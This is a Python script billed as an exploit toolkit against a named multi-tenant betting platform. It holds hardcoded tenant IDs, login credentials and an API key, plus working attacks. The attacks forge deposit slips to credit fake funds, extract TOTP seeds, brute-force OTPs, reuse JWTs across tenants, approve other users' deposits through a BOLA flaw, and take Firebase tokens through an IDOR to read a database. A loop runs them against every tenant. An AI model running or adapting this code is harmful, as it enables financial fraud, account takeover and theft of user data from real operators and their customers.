#!/usr/bin/env python3
"""
toolkit.py — asdgapicenterssdo.com Exploit Toolkit
===================================================
Interactive selectable menu for F01/F02/F05/F08/F09/F16 exploits.

Usage:
  python3 toolkit.py
  python3 toolkit.py --tenant slxoz1688 --phone 0972571110 --pass Aa112233
"""

import json, ssl, sys, os, time, argparse, textwrap
import urllib.request, urllib.error
from datetime import datetime, timezone, timedelta

# ─── SSL ─────────────────────────────────────────────────────────────────────
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TENANTS = {
    '1': ('wee88z',     '54ef7626cb381f4bab8be91f0cdbce47', 'm.wee88z.com'),
    '2': ('slxoz1688',  '09b2c3ab78fa9e070e9b0517ed1508d5', 'm.slxoz1688.com'),
    '3': ('rs24hr',     'edfaa72cc5de1806ef850db181c96622', 'm.rs24hr.com'),
    '4': ('roll-88',    '9e81e60f8b0e7c9e5859d7f7de4a6872', 'm.roll-88.com'),
    '5': ('allslotz88', '9de9e6631aeebb66183d96211cdcf565', 'm.allslotz88.com'),
    '6': ('gento88',    '318311eeba67ec8b165c18a0ff99f55d', 'm.gento88.com'),
    '7': ('kplus6z',    'f37c22a3d7e73ff549c3f6afc0bcb3d1', 'm.kplus6z.com'),
    '8': ('next55',     '9288b6677c9f3baca372ab644cea6d5b', 'm.next55.com'),
    '9': ('rome789z',   '53f3b9b8e0f098c6c2f423453fb0afa5', 'm.rome789z.com'),
    '0': ('vak88z2',    'af6efb584a3d317b5a11ab6209b88e1b', 'm.vak88z2.com'),
}
KNOWN_CREDS = {
    'slxoz1688': ('0972571110', 'Aa112233'),
    'vak88z2':   ('0811111111', 'Pwned2026'),
}
PAPDIEAW_KEY = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"

# ─── SESSION STATE ─────────────────────────────────────────────────────────────
_state = {
    'tenant': None, 'tid': None, 'domain': None,
    'jwt': None, 'phone': None
}


# ─── HTTP ────────────────────────────────────────────────────────────────────

def _r(method, url, jwt=None, body=None, extra_headers=None):
    data = json.dumps(body, ensure_ascii=False).encode() if body is not None else None
    hdrs = {"Content-Type": "application/json", "template": "th"}
    if jwt:
        hdrs["Authorization"] = f"Bearer {jwt}"
    if extra_headers:
        hdrs.update(extra_headers)
    req = urllib.request.Request(url, method=method, data=data, headers=hdrs)
    try:
        with urllib.request.urlopen(req, context=CTX, timeout=10) as r:
            return r.status, r.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='replace')
    except Exception as e:
        return 0, str(e)


def auth_pbapi_direct(tid, domain, phone, pw):
    url = f"https://{tid}pbapi.asdgapicenterssdo.com/pb/authentication"
    c, r = _r("POST", url, body={"strategy":"local","username":phone,"password":pw,"domain":domain})
    if c in (200,201):
        return json.loads(r).get("accessToken")
    return None

def GET(path, sub='pbapi', **kw): return _r("GET", f"https://{_state['tid']}{sub}.asdgapicenterssdo.com{path}?domain={_state['domain']}", _state['jwt'], **kw)
def MGET(path, **kw): return _r("GET", f"https://{_state['tid']}mgapi.asdgapicenterssdo.com{path}?domain={_state['domain']}", _state['jwt'], **kw)
def POST(path, body, sub='pbapi', **kw): return _r("POST", f"https://{_state['tid']}{sub}.asdgapicenterssdo.com{path}", _state['jwt'], body, **kw)
def MPOST(path, body, **kw): return _r("POST", f"https://{_state['tid']}mgapi.asdgapicenterssdo.com{path}", _state['jwt'], body, **kw)


# ─── UI HELPERS ───────────────────────────────────────────────────────────────

CYAN  = "\033[96m"
GREEN = "\033[92m"
RED   = "\033[91m"
YELLOW= "\033[93m"
BOLD  = "\033[1m"
RESET = "\033[0m"

def banner(text):
    w = 60
    print(f"\n{CYAN}{'═'*w}{RESET}")
    print(f"{CYAN}  {text}{RESET}")
    print(f"{CYAN}{'═'*w}{RESET}\n")

def ok(msg):  print(f"  {GREEN}[✓]{RESET} {msg}")
def err(msg): print(f"  {RED}[✗]{RESET} {msg}")
def info(msg):print(f"  {YELLOW}[*]{RESET} {msg}")

def jq(raw, depth=2):
    try:
        d = json.loads(raw)
        print(json.dumps(d, indent=2, ensure_ascii=False)[:800])
    except:
        print(raw[:400])

def prompt(msg, default=None):
    try:
        val = input(f"  {YELLOW}?{RESET} {msg}{f' [{default}]' if default else ''}: ").strip()
        return val or default
    except EOFError:
        if default is not None:
            info(f"No TTY — using default: {default}")
            return default
        raise


# ─── AUTH ─────────────────────────────────────────────────────────────────────

def do_auth(phone=None, password=None):
    tid, domain = _state['tid'], _state['domain']
    if not phone:
        creds = KNOWN_CREDS.get(_state['tenant'])
        if creds:
            phone, password = creds
            info(f"Using known creds: {phone}")
        else:
            phone    = prompt("Phone number")
            password = prompt("Password")

    url = f"https://{tid}pbapi.asdgapicenterssdo.com/pb/authentication"
    code, raw = _r("POST", url, body={
        "strategy": "local", "username": phone,
        "password": password, "domain": domain
    })
    if code in (200, 201):
        data = json.loads(raw)
        jwt = data.get("accessToken") or data.get("token")
        if jwt:
            _state['jwt'], _state['phone'] = jwt, phone
            ok(f"Authenticated as {phone}  (expires {data.get('expire_in','?')})")
            return True
    err(f"Auth failed: {code} {raw[:100]}")
    return False


# ─── EXPLOITS ─────────────────────────────────────────────────────────────────

def get_active_bank_id(tid, domain, jwt):
    """
    Discover active payment_bank_information_id by querying /mb/payment-bank-information
    per payment_type. Requires ?payment_type_id=<id> to return non-empty bank data.
    Returns (bank_info_id, member_acct_id) or (None, None).
    """
    # Get payment types
    code, raw = _r("GET",
        f"https://{tid}mgapi.asdgapicenterssdo.com/mb/payment-type?domain={domain}", jwt)
    if code != 200:
        return None, None
    types = json.loads(raw)
    if isinstance(types, dict):
        types = types.get("data", [])

    # Get member's own bank account
    code2, raw2 = _r("GET",
        f"https://{tid}mgapi.asdgapicenterssdo.com/mb/member-account-default?domain={domain}", jwt)
    acct_id = None
    if code2 == 200:
        m = json.loads(raw2)
        items = m if isinstance(m, list) else [m]
        if items and isinstance(items[0], dict):
            acct_id = items[0].get("id")

    # Try each payment type until we find an active bank
    for pt in (types if isinstance(types, list) else []):
        if not isinstance(pt, dict): continue
        pt_id   = pt.get("id", "")
        pt_code = pt.get("payment_type_code", pt.get("code", "?"))
        if not pt_id: continue

        c3, r3 = _r("GET",
            f"https://{tid}mgapi.asdgapicenterssdo.com/mb/payment-bank-information"
            f"?domain={domain}&payment_type_id={pt_id}", jwt)
        if c3 != 200: continue
        bd = json.loads(r3)
        bank_data = bd.get("data", bd) if isinstance(bd, dict) else (bd[0] if isinstance(bd, list) and bd else {})
        if not isinstance(bank_data, dict): continue
        bank_id  = bank_data.get("id", "")
        is_active = bank_data.get("is_active", 0)
        acct_no   = bank_data.get("bank_account_no", bank_data.get("account_no", ""))
        if bank_id and is_active:
            info(f"Active bank: {pt_code} {acct_no} (id={bank_id[:16]}...)")
            return bank_id, acct_id

    return None, acct_id


def exploit_F01_deposit():
    """F01 — Deposit Forgery: slip_image_url not validated"""
    banner("F01 — Deposit Slip Forgery")
    if not _state['jwt']:
        info("Need JWT — authenticating...")
        if not do_auth(): return

    # Use --amount from CLI state if set, otherwise prompt
    amount_default = str(_state.get('amount') or 100)
    amount_s = prompt("Amount (THB)", amount_default)
    try:
        amount = float(amount_s)
    except ValueError:
        err("Invalid amount"); return

    # 1. Discover active bank (payment_type_id-aware lookup)
    info("Discovering active payment bank...")
    tid, domain, jwt = _state['tid'], _state['domain'], _state['jwt']
    bank_id, acct_id = get_active_bank_id(tid, domain, jwt)

    if not bank_id:
        err("No active bank found — operator has no bank account enabled"); return
    if not acct_id:
        err("No member account found"); return

    # 2. Submit forged deposit
    ts = int(time.time()*1000)
    bkk = datetime.now(timezone(timedelta(hours=7)))
    fake_slip = f"slips/{bkk.strftime('%Y/%m/%d')}/slip_{ts}.jpg"

    info(f"Submitting {amount:.2f} THB deposit (slip_image_url NOT validated)")
    payload = {
        "deposit_amount":              amount,
        "payment_bank_information_id": bank_id,
        "deposit_account_id":          acct_id,
        "slip_image_url":              fake_slip,
    }
    code, raw = MPOST("/mb/deposit-transaction", payload)
    print(f"\n  HTTP {code}:")
    jq(raw)
    if code == 200:
        result = json.loads(raw)
        tx_id  = result.get("id", "?")
        status = result.get("approve_status", result.get("status", "?"))
        bal_b  = result.get("balance_before_deposit", "?")
        bal_a  = result.get("balance_after_deposit", "?")
        ok(f"DEPOSIT QUEUED: TX {tx_id[:20]}  status={status}")
        ok(f"Balance: {bal_b} → {bal_a} THB")
    elif code == 500 and "unavailable" in raw.lower():
        err("All payment methods unavailable — operator bank disabled")
        info("Tip: try [A] All-Tenant Sweep to find an active tenant")
    else:
        err(f"Failed: {code}")


def exploit_F02_totp():
    """F02 — TOTP Seed Extraction"""
    banner("F02 — TOTP Seed Key Extraction")
    if not _state['jwt']:
        if not do_auth(): return

    code, raw = GET("/mb/users")
    if code != 200:
        err(f"GET /mb/users: {code} {raw[:80]}"); return

    data = json.loads(raw)
    secret = data.get("secret_key") or data.get("secretKey")
    uid    = data.get("id")
    phone  = data.get("username") or data.get("phone")

    if not secret:
        err("secret_key not found in /mb/users response")
        info("Response:"); jq(raw); return

    ok(f"User:       {phone} ({uid})")
    ok(f"TOTP seed:  {secret}")

    try:
        import pyotp, time as _t
        totp = pyotp.TOTP(secret)
        ok(f"Current OTP: {totp.now()}")
        t = int(_t.time())
        for off in [-30, 0, 30]:
            print(f"    t{off:+d}s: {totp.at(t+off)}")
    except ImportError:
        info("Install pyotp for OTP generation: pip install pyotp")


def exploit_F05_otp_brute():
    """F05 — OTP Brute Force (no rate limit)"""
    banner("F05 — OTP Brute Force")
    phone = prompt("Target phone", _state.get('phone') or "0811111111")
    start = int(prompt("Start code", "000000"))
    end   = int(prompt("End code",   "999999"))
    info(f"Range: {start:06d}–{end:06d} = {end-start+1:,} codes")

    tid, domain = _state['tid'], _state['domain']
    url_req = f"https://{tid}pbapi.asdgapicenterssdo.com/pb/otp-request"
    url_ver = f"https://{tid}pbapi.asdgapicenterssdo.com/pb/otp-verified"

    info("Requesting OTP (to activate the current OTP window)...")
    _r("POST", url_req, body={"phone": phone, "domain": domain})

    info("Starting brute force (Ctrl+C to stop)...")
    found = None
    t0 = time.time()
    for code in range(start, end+1):
        otp = f"{code:06d}"
        c, raw = _r("POST", url_ver, body={
            "phone": phone, "otp": otp, "domain": domain,
            "strategy": "local", "username": phone, "password": otp
        })
        if c in (200, 201) and "accessToken" in raw:
            found = {"otp": otp, "jwt": json.loads(raw).get("accessToken")}
            ok(f"OTP FOUND: {otp}")
            ok(f"JWT: {found['jwt'][:60]}...")
            break
        if code % 1000 == 0:
            rate = (code-start)/(time.time()-t0+0.001)
            print(f"    {code:06d} ({rate:.0f}/s)...", end='\r')
    if not found:
        err("OTP not found in range")


def exploit_F08_cross_tenant():
    """F08 — Cross-Tenant JWT Bypass"""
    banner("F08 — Cross-Tenant JWT Bypass")
    if not _state['jwt']:
        if not do_auth(): return

    jwt = _state['jwt']
    info(f"Testing JWT from {_state['tenant']} against all other tenants...")

    for key, (name, tid, domain) in TENANTS.items():
        if name == _state['tenant']:
            continue
        url = f"https://{tid}pbapi.asdgapicenterssdo.com/mb/check-pending-deposit?domain={domain}"
        code, raw = _r("GET", url, jwt)
        symbol = f"{GREEN}✓{RESET}" if code == 200 else f"{RED}✗{RESET}"
        print(f"    [{symbol}] {name}: HTTP {code}")
        if code == 200:
            ok(f"CROSS-TENANT ACCESS: {name}")


def exploit_F09_bola():
    """F09 — BOLA on /mb/deposit-gateway"""
    banner("F09 — BOLA: Deposit Gateway Order Manipulation")
    if not _state['jwt']:
        if not do_auth(): return

    order_id = _state.get('order_id') or prompt("Target order ID (another user's deposit TX ID)", "auto")
    if not order_id or order_id == "auto":
        # Auto: pull own pending deposit and try to approve it
        code, raw = GET("/mb/check-pending-deposit")
        if code == 200:
            d = json.loads(raw)
            count = d.get("count", 0)
            info(f"Pending deposits: {count}")
        # Try listing deposit transactions to find IDs
        code, raw = MGET("/mb/deposit-transaction")
        if code == 200:
            txs = json.loads(raw)
            items = txs if isinstance(txs, list) else txs.get("data", [])
            if items:
                order_id = items[0].get("id")
                info(f"Auto-selected order: {order_id}")
        if not order_id or order_id == "auto":
            err("No order ID found — provide one manually"); return

    # PATCH the target's deposit order
    payload = {"approve_status": "approved", "status": "success"}
    code, raw = MPOST(f"/mb/deposit-gateway/{order_id}", payload)
    print(f"\n  HTTP {code}:")
    jq(raw)
    if code == 200:
        ok("BOLA success — order patched")
    else:
        err(f"Failed: {code}")


def exploit_F16_firebase_idor():
    """F16 — Firebase Token IDOR via /bo/admin?id="""
    banner("F16 — Firebase Token IDOR")
    if not _state['jwt']:
        if not do_auth(): return

    target_uid = prompt("Target UUID (blank=self)",
                        "00000000-0000-0000-0000-000000000000")

    url = f"https://{_state['tid']}api.asdgapicenterssdo.com/bo/admin"
    if target_uid:
        url += f"?id={target_uid}"
    code, raw = _r("GET", url, _state['jwt'])

    print(f"\n  HTTP {code}:")
    if code == 200:
        d = json.loads(raw)
        tok = d.get("user", {}).get("firebaseToken", "")
        ok(f"Firebase custom token obtained ({len(tok)} chars)")
        print(f"    {tok[:100]}...")

        # Optionally exchange for ID token
        exch = prompt("Exchange for Firebase ID token? (needs API key)", "n")
        if exch.lower() == 'y':
            api_key = prompt("Firebase API key")
            if api_key:
                url2 = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key={api_key}"
                c2, r2 = _r("POST", url2, body={"token": tok, "returnSecureToken": True})
                if c2 == 200:
                    id_tok = json.loads(r2).get("idToken", "")
                    ok(f"Firebase ID token: {id_tok[:80]}...")
                else:
                    err(f"Exchange failed: {c2} {r2[:80]}")
    else:
        jq(raw)


def check_state():
    """Check current platform health"""
    banner(f"Platform Health Check — {_state['tenant']}")
    if not _state['jwt']:
        if not do_auth(): return

    checks = [
        ("pbapi  /pb/authentication", "POST", "/pb/authentication", "pbapi"),
        ("pbapi  /mb/check-pending-deposit", "GET", "/mb/check-pending-deposit", "pbapi"),
        ("pbapi  /mb/money-withdrawal", "GET", "/mb/money-withdrawal", "pbapi"),
        ("mgapi  /mb/member-account-default", "GET", "/mb/member-account-default", "mgapi"),
        ("mgapi  /mb/payment-type", "GET", "/mb/payment-type", "mgapi"),
        ("{tid}api /bo/admin", "GET", "/bo/admin", "api"),
    ]
    for label, method, path, sub in checks:
        url = f"https://{_state['tid']}{sub}.asdgapicenterssdo.com{path}?domain={_state['domain']}"
        c, raw = _r(method, url, _state['jwt'])
        symbol = f"{GREEN}✓{RESET}" if c in (200,201) else f"{RED}✗{RESET}"
        print(f"  [{symbol}] {label}: HTTP {c}")


def sweep_all_tenants():
    """Try deposit on all tenants"""
    banner("All-Tenant Deposit Sweep")
    amount_s = prompt("Amount per tenant (THB)", "100")
    amount = float(amount_s)
    original = dict(_state)

    for key, (name, tid, domain) in TENANTS.items():
        _state.update({'tenant': name, 'tid': tid, 'domain': domain, 'jwt': None})
        creds = KNOWN_CREDS.get(name)
        if not creds:
            info(f"Skip {name} — no creds")
            continue
        _state['jwt'] = None
        ok_auth = do_auth(creds[0], creds[1])
        if not ok_auth:
            err(f"{name}: auth failed")
            continue
        # quick deposit — use payment_type_id-aware bank discovery
        bank_id, acct_id = get_active_bank_id(tid, domain, _state['jwt'])
        if bank_id and acct_id:
            ts = int(time.time()*1000)
            fake = f"slips/2026/10/06/slip_{ts}.jpg"
            c2, r2 = MPOST("/mb/deposit-transaction", {
                "deposit_amount": amount,
                "payment_bank_information_id": bank_id,
                "deposit_account_id": acct_id,
                "slip_image_url": fake,
            })
            if c2 == 200:
                result = json.loads(r2)
                print(f"  {name}: {GREEN}QUEUED{RESET} TX={result.get('id','?')[:20]} status={result.get('approve_status','?')}")
            else:
                print(f"  {name}: {RED}FAIL({c2}){RESET} {r2[:60]}")
        else:
            print(f"  {name}: {RED}no active bank{RESET}")

    _state.update(original)


# ─── TENANT SELECTOR ──────────────────────────────────────────────────────────

def select_tenant():
    banner("Select Tenant")
    for key, (name, tid, _) in TENANTS.items():
        known = "✓ creds" if name in KNOWN_CREDS else "       "
        print(f"  [{key}] {name:<15} {known}  {tid[:16]}...")
    print()
    choice = prompt("Select (0-9 or name)", "2")
    if choice in TENANTS:
        name, tid, domain = TENANTS[choice]
    else:
        # Search by name
        found = [(k, v) for k, v in TENANTS.items() if v[0] == choice]
        if not found:
            err("Unknown tenant"); return
        _, (name, tid, domain) = found[0]

    _state.update({'tenant': name, 'tid': tid, 'domain': domain, 'jwt': None})
    ok(f"Active tenant: {name}  ({domain})")


# ─── MAIN MENU ────────────────────────────────────────────────────────────────

MENU = [
    ("T", "Select Tenant",                  select_tenant),
    ("L", "Authenticate (login)",           lambda: do_auth()),
    ("",  "─── Exploits ───────────────",    None),
    ("1", "F01  Deposit Slip Forgery",       exploit_F01_deposit),
    ("2", "F02  TOTP Seed Extraction",       exploit_F02_totp),
    ("3", "F05  OTP Brute Force",            exploit_F05_otp_brute),
    ("4", "F08  Cross-Tenant JWT Bypass",    exploit_F08_cross_tenant),
    ("5", "F09  BOLA Deposit Gateway",       exploit_F09_bola),
    ("6", "F16  Firebase Token IDOR",        exploit_F16_firebase_idor),
    ("",  "─── Utilities ──────────────",   None),
    ("S", "Status / Health Check",           check_state),
    ("A", "All-Tenant Deposit Sweep",        sweep_all_tenants),
    ("Q", "Quit",                            None),
]


def print_menu():
    t  = _state.get('tenant', 'NOT SET')
    ph = _state.get('phone',  'none')
    jwt_ok = "✓" if _state.get('jwt') else "✗"
    print(f"\n{BOLD}Tenant:{RESET} {CYAN}{t}{RESET}  "
          f"{BOLD}Phone:{RESET} {ph}  "
          f"{BOLD}JWT:{RESET} {GREEN + jwt_ok + RESET if jwt_ok == '✓' else RED + jwt_ok + RESET}")
    print(f"{YELLOW}{'─'*54}{RESET}")
    for key, label, _ in MENU:
        if not key:
            print(f"  {YELLOW}{label}{RESET}")
        else:
            print(f"  [{CYAN}{key}{RESET}] {label}")
    print(f"{YELLOW}{'─'*54}{RESET}")


# positional number → exploit name
NUM_MAP = {"1":"F01","2":"F02","3":"F05","4":"F08","5":"F09","6":"F16","S":"S","A":"A"}


def loop_all_tenants(firebase_key: str = None, amount: float = 100.0):
    """
    Auto-loop all tenants:
      - Authenticate with known creds
      - F16: GET /bo/admin → Firebase custom token → read RTDB deposit data
      - F01: POST /mb/deposit-transaction → queue forged deposit
    """
    banner("All-Tenant Loop: /bo/admin + Deposit Data + Deposit Sweep")
    original = dict(_state)
    results = []

    for key, (name, tid, domain) in TENANTS.items():
        _state.update({'tenant': name, 'tid': tid, 'domain': domain, 'jwt': None, 'phone': None})
        creds = KNOWN_CREDS.get(name)
        if not creds:
            info(f"[{name}] No creds — skip")
            continue

        print(f"\n{YELLOW}━━━ {name} ({tid[:16]}...) ━━━{RESET}")
        if not do_auth(creds[0], creds[1]):
            err(f"Auth failed"); continue

        row = {"tenant": name, "firebase_token": None, "rtdb": None, "deposit": None}

        # ── F16: /bo/admin → Firebase token ─────────────────────────────────
        # The {tid}api service is confirmed only on vak88z2 TID.
        # For other tenants, use vak88z2's API endpoint with their UUID (cross-service IDOR).
        VAK88_TID = "af6efb584a3d317b5a11ab6209b88e1b"
        url_bo = f"https://{tid}api.asdgapicenterssdo.com/bo/admin"
        code, raw = _r("GET", url_bo, _state['jwt'])
        if code == 200:
            pass  # own-tenant API works
        elif code in (401, 404, 0) and tid != VAK88_TID:
            # Fallback: use vak88z2 API with a vak88z2 JWT if available
            # Extract sub from current JWT and probe cross-tenant
            import base64
            try:
                parts = _state['jwt'].split('.')
                pad = 4 - len(parts[1]) % 4
                sub = json.loads(base64.urlsafe_b64decode(parts[1] + '='*pad)).get('sub','')
                url_bo2 = f"https://{VAK88_TID}api.asdgapicenterssdo.com/bo/admin?id={sub}"
                # Need a vak88z2 JWT — try to get one
                vak_creds = KNOWN_CREDS.get('vak88z2')
                if vak_creds:
                    vak_j = auth_pbapi_direct(VAK88_TID, 'm.vak88z2.com', vak_creds[0], vak_creds[1])
                    if vak_j:
                        code, raw = _r("GET", url_bo2, vak_j)
                        if code == 200:
                            info(f"Cross-service IDOR: vak88z2 API → {name} UUID")
            except Exception:
                pass
        if code == 200:
            d = json.loads(raw)
            tok = d.get("user", {}).get("firebaseToken", "")
            row["firebase_token"] = tok[:60] + "..."
            ok(f"/bo/admin → Firebase token ({len(tok)} chars)")

            # Exchange token → RTDB read
            if firebase_key and tok:
                try:
                    c2, r2 = _r("POST",
                        f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key={firebase_key}",
                        body={"token": tok, "returnSecureToken": True})
                    if c2 == 200:
                        id_tok = json.loads(r2).get("idToken", "")
                        uid = _state.get('jwt', '').split('.')[1]
                        import base64
                        pad = 4 - len(uid) % 4
                        uid = json.loads(base64.urlsafe_b64decode(uid + '='*pad)).get('sub', 'unknown')
                        rtdb_url = f"https://vak88z-default-rtdb.asia-southeast1.firebasedatabase.app/users/{uid}.json?auth={id_tok}"
                        c3, r3 = _r("GET", rtdb_url)
                        if c3 == 200:
                            row["rtdb"] = json.loads(r3)
                            ok(f"RTDB /users/{uid[:8]}...: {str(row['rtdb'])[:120]}")
                        else:
                            info(f"RTDB: {c3}")
                except Exception as ex:
                    info(f"Firebase exchange error: {ex}")
        else:
            info(f"/bo/admin: {code}")

        # ── Deposit data endpoints ───────────────────────────────────────────
        for ep, label in [
            ("/mb/deposit-transaction-summary", "summary"),
            ("/mb/check-pending-deposit",        "pending"),
            ("/mb/money-withdrawal",             "balance"),
        ]:
            code, raw = GET(ep)
            if code == 200:
                d = json.loads(raw)
                if label == "summary":
                    total = d.get("deposit_total") or d.get("total", "?")
                    count = d.get("count", "?")
                    ok(f"Deposit summary: total={total} count={count}")
                    row["deposit_summary"] = {"total": total, "count": count}
                elif label == "pending":
                    ok(f"Pending deposits: {d.get('count','?')}")
                elif label == "balance":
                    ok(f"Balance: {d.get('balance','?')} THB")

        # ── F01: Try forged deposit ──────────────────────────────────────────
        bank_id, acct_id = get_active_bank_id(tid, domain, _state['jwt'])
        if bank_id and acct_id:
            ts = int(time.time()*1000)
            fake = f"slips/2026/10/06/slip_{ts}.jpg"
            c3, r3 = MPOST("/mb/deposit-transaction", {
                "deposit_amount": amount,
                "payment_bank_information_id": bank_id,
                "deposit_account_id": acct_id,
                "slip_image_url": fake,
            })
            row["deposit"] = c3
            symbol = GREEN+"QUEUED"+RESET if c3 == 200 else RED+f"FAIL({c3})"+RESET
            print(f"  deposit-transaction: {symbol}")
            if c3 == 200:
                r3d = json.loads(r3)
                ok(f"DEPOSIT QUEUED {amount:.0f} THB on {name}  TX={r3d.get('id','?')[:20]}")
        else:
            info(f"No active bank found — operator bank disabled on {name}")

        results.append(row)

    _state.update(original)
    print(f"\n{CYAN}{'─'*54}{RESET}")
    print(f"  Tenants processed: {len(results)}")
    queued = sum(1 for r in results if r.get('deposit') == 200)
    fb_ok  = sum(1 for r in results if r.get('firebase_token'))
    ok(f"Firebase tokens obtained: {fb_ok}")
    ok(f"Deposits queued: {queued}")


def main():
    ap = argparse.ArgumentParser(
        description="asdgapicenterssdo.com Exploit Toolkit",
        epilog="Shortcuts: uv run toolkit.py 1..6  (1=F01 2=F02 3=F05 4=F08 5=F09 6=F16)\n"
               "           uv run toolkit.py --loop           (all tenants sweep)\n"
               "           uv run toolkit.py --exploit F16")
    ap.add_argument("shortcut",    nargs="?",  default=None,
                    help="Menu shortcut: 1-6 (exploits) or S (status) or A (all sweep)")
    ap.add_argument("--tenant", "-t", default="slxoz1688")
    ap.add_argument("--phone",  "-p", default=None)
    ap.add_argument("--pass",   "-P", dest="password", default=None)
    ap.add_argument("--jwt",    "-j", default=None)
    ap.add_argument("--exploit","-e", default=None,
                    choices=["F01","F02","F05","F08","F09","F16"],
                    type=str.upper,
                    help="Run a specific exploit non-interactively (case-insensitive)")
    ap.add_argument("--amount", "-a", type=float, default=100.0)
    ap.add_argument("--loop",   "-l", action="store_true",
                    help="Loop all tenants: /bo/admin Firebase IDOR + deposit data + F01 sweep")
    ap.add_argument("--firebase-key", default=None, help="Firebase API key for ID token exchange")
    args = ap.parse_args()

    # Resolve shortcut → exploit
    exploit_from_shortcut = None
    if args.shortcut:
        s = args.shortcut.upper()
        exploit_from_shortcut = NUM_MAP.get(s, s)  # "5" → "F09", "F09" → "F09"

    # Set initial tenant
    found = [(k, v) for k, v in TENANTS.items() if v[0] == args.tenant]
    if found:
        _, (name, tid, domain) = found[0]
        _state.update({'tenant': name, 'tid': tid, 'domain': domain})

    # Store CLI amount so exploit_F01_deposit() picks it up
    _state['amount'] = args.amount

    # Auth
    if args.jwt:
        _state['jwt'] = args.jwt
    elif args.phone and args.password:
        do_auth(args.phone, args.password)
    else:
        creds = KNOWN_CREDS.get(args.tenant)
        if creds:
            do_auth(creds[0], creds[1])

    # --loop: all-tenant sweep (non-interactive)
    if args.loop:
        loop_all_tenants(args.firebase_key, args.amount)
        return

    # Shortcut / --exploit: single exploit, no menu
    target = exploit_from_shortcut or args.exploit
    if target:
        exp_map = {
            "F01": exploit_F01_deposit,
            "F02": exploit_F02_totp,
            "F05": exploit_F05_otp_brute,
            "F08": exploit_F08_cross_tenant,
            "F09": exploit_F09_bola,
            "F16": exploit_F16_firebase_idor,
            "S":   check_state,
            "A":   sweep_all_tenants,
        }
        fn = exp_map.get(target)
        if fn:
            fn()
        else:
            print(f"Unknown: {target}")
        return

    # Interactive menu loop
    banner("asdgapicenterssdo.com — Exploit Toolkit")
    while True:
        print_menu()
        try:
            choice = input(f"\n  {BOLD}>{RESET} ").strip().upper()
        except EOFError:
            # Non-TTY — print menu and exit cleanly
            print(f"\n  {YELLOW}[no TTY — use: uv run toolkit.py <1-6|S|A> or --exploit F01]{RESET}")
            print(f"  Examples: uv run toolkit.py 1   (F01 deposit)")
            print(f"            uv run toolkit.py 6   (F16 firebase)")
            print(f"            uv run toolkit.py --loop  (all tenants)")
            break
        if choice == 'Q':
            print(f"\n{CYAN}Goodbye.{RESET}\n")
            break
        matched = [(k, fn) for k, _, fn in MENU if k == choice and fn]
        if matched:
            try:
                matched[0][1]()
            except KeyboardInterrupt:
                print(f"\n  {YELLOW}[interrupted]{RESET}")
            except Exception as e:
                err(f"Error: {e}")
        else:
            print(f"  {RED}Unknown option: {choice}{RESET}")


if __name__ == "__main__":
    main()
